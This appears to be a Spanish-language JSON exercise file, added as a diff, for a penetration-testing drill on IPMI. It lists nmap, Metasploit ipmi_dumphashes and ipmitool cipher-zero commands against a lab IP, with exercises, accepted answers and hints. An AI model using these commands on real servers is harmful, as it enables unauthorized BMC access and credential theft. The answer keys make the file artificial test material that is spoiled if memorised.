@@ -1,0 +1,81 @@
+{
+  "tool": {
+    "nombre": "IPMI",
+    "protocolo": "IPMI (623 udp)",
+    "descripcion": "Intelligent Platform Management Interface. Protocolo de gestion fuera de banda que usan las BMC (iDRAC, iLO, IMM) para administrar servidores fisicos. La version 2.0 tiene fallos conocidos como el volcado de hashes de autenticacion (cipher zero y RAKP), lo que la vuelve un objetivo jugoso. Herramientas clave: nmap, metasploit e ipmitool."
+  },
+  "commands": [
+    {
+      "comando": "nmap -sU -p623 10.10.10.10",
+      "descripcion": "Escaneo del puerto 623 sobre UDP para confirmar que el servicio IPMI esta activo."
+    },
+    {
+      "comando": "nmap -sU -p623 --script ipmi-version 10.10.10.10",
+      "descripcion": "Consulta la version del servicio IPMI y los mecanismos de autenticacion soportados."
+    },
+    {
+      "comando": "nmap -sU -p623 --script ipmi-cipher-zero 10.10.10.10",
+      "descripcion": "Verifica si el servicio es vulnerable a IPMI Cipher Zero, que permite login sin contrasena."
+    },
+    {
+      "comando": "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.10; run'",
+      "descripcion": "Vuelca los hashes RAKP de IPMI 2.0 con el modulo auxiliar de Metasploit para crackearlos offline."
+    },
+    {
+      "comando": "ipmitool -I lanplus -H 10.10.10.10 -U admin -P admin user list",
+      "descripcion": "Lista los usuarios de la BMC autenticandose por lanplus con credenciales validas."
+    },
+    {
+      "comando": "ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P '' user list",
+      "descripcion": "Explota IPMI Cipher Zero (-C 0) para listar usuarios sin necesidad de contrasena valida."
+    }
+  ],
+  "exercises": [
+    {
+      "enunciado": "Quieres confirmar que el servicio IPMI esta activo en 10.10.10.10 escaneando su puerto, recordando que IPMI corre sobre UDP. Escribe el comando de nmap.",
+      "respuestas_aceptadas": [
+        "nmap -sU -p623 10.10.10.10",
+        "sudo nmap -sU -p623 10.10.10.10",
+        "nmap -p623 -sU 10.10.10.10"
+      ],
+      "pista": "IPMI no es TCP, tienes que usar el tipo de escaneo de UDP y el puerto 623.",
+      "explicacion": "nmap -sU -p623 10.10.10.10 escanea el puerto 623 sobre UDP. El detalle clave es -sU, porque IPMI usa UDP y un escaneo TCP normal no lo veria. Confirmar que esta abierto es el arranque antes de sacar la version o probar cipher zero."
+    },
+    {
+      "enunciado": "Quieres consultar la version del servicio IPMI de 10.10.10.10 y sus mecanismos de autenticacion usando el script ipmi-version de nmap. Escribe el comando.",
+      "respuestas_aceptadas": [
+        "nmap -sU -p623 --script ipmi-version 10.10.10.10",
+        "nmap --script ipmi-version -sU -p623 10.10.10.10"
+      ],
+      "pista": "Combina -sU, -p623 y --script ipmi-version.",
+      "explicacion": "nmap -sU -p623 --script ipmi-version 10.10.10.10 devuelve la version del IPMI y los cifrados/autenticaciones soportadas. Es lo que te dice si estas frente a una BMC con IPMI 2.0 vulnerable a Cipher Zero o al volcado de hashes RAKP."
+    },
+    {
+      "enunciado": "Quieres verificar si el IPMI de 10.10.10.10 es vulnerable a IPMI Cipher Zero con el script correspondiente de nmap. Escribe el comando.",
+      "respuestas_aceptadas": [
+        "nmap -sU -p623 --script ipmi-cipher-zero 10.10.10.10",
+        "nmap --script ipmi-cipher-zero -sU -p623 10.10.10.10"
+      ],
+      "pista": "Igual que el anterior pero cambiando el script a ipmi-cipher-zero.",
+      "explicacion": "nmap -sU -p623 --script ipmi-cipher-zero 10.10.10.10 confirma si el servicio acepta Cipher Suite 0, que permite autenticarte con cualquier usuario y sin contrasena. Si el script reporta VULNERABLE, ya puedes usar ipmitool -C 0 para entrar."
+    },
+    {
+      "enunciado": "El IPMI de 10.10.10.10 es vulnerable a Cipher Zero. Usa ipmitool por lanplus para listar los usuarios de la BMC, con el usuario admin y sin contrasena. Escribe el comando.",
+      "respuestas_aceptadas": [
+        "ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P '' user list",
+        "ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P \"\" user list"
+      ],
+      "pista": "ipmitool con -I lanplus, -C 0 para cipher zero, -H el host, -U admin, -P vacio y el subcomando user list.",
+      "explicacion": "ipmitool -I lanplus -C 0 -H 10.10.10.10 -U admin -P '' user list explota Cipher Zero para listar los usuarios de la BMC sin necesidad de credenciales validas. Con la lista de usuarios ya puedes crear una contrasena nueva o resetear una existente."
+    },
+    {
+      "enunciado": "Quieres volcar los hashes RAKP de IPMI 2.0 de 10.10.10.10 con el modulo auxiliar ipmi_dumphashes de Metasploit para crackearlos offline. Escribe el comando.",
+      "respuestas_aceptadas": [
+        "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.10; run'",
+        "msfconsole -q -x \"use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 10.10.10.10; run\""
+      ],
+      "pista": "Es msfconsole -q -x con la secuencia use ...ipmi_dumphashes; set RHOSTS ...; run entre comillas.",
+      "explicacion": "msfconsole -q -x '...ipmi_dumphashes; set RHOSTS 10.10.10.10; run' aprovecha el bug de diseno de IPMI 2.0 que entrega el hash RAKP-HMAC-SHA1 del usuario antes de completar el login. Ese hash se crackea despues con hashcat modo 7300 y suele caer rapido porque muchas BMC llevan contrasenas de fabrica."
+    }
+  ]
+}
